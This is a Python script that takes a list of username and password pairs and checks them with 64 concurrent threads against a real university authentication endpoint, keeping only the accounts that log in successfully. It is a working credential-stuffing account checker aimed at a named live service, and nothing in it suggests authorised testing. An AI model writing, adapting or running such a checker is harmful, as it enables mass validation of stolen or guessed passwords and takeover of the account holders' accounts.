import json
import threading
import time
from queue import Queue
import requests

from excel2json import save_json_file, get_json_data

task_queue = Queue()
available_account_queue = Queue()


class AccountCheckThread(threading.Thread):
    def run(self):
        while task_queue.qsize() > 0:
            account = task_queue.get()
            if account_check(account["username"],account["password"]):
                print(account)
                available_account_queue.put(account)


def account_check(username, password):
    url = r"https://mps.zocedu.com/api/auth/checkRadiusAndPass"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    data = {
        "schoolCode": "10488",
        "userName": str(username),
        "password": str(password)
    }

    response = requests.post(url, data, headers=headers).json()
    return response["flag"]


def account_list_check(filepath, thread_num):
    account_list = get_json_data(filepath)
    for account in account_list:
        task_queue.put(account)

    thread_list = []
    for i in range(thread_num):
        thread = AccountCheckThread()
        thread_list.append(thread)
        thread.setDaemon(True)
        thread.start()
    for t in thread_list:
        t.join()

    available_account_list = []
    while available_account_queue.qsize() > 0:
        available_account_list.append(available_account_queue.get())
    json_data = json.dumps(available_account_list, ensure_ascii=False, indent=2)
    save_json_file(json_data, filepath)


if __name__ == '__main__':
    filepath = "namelist.json"

    start_time = time.time()
    account_list_check(filepath, 64)
    end_time = time.time()

    print(end_time-start_time)
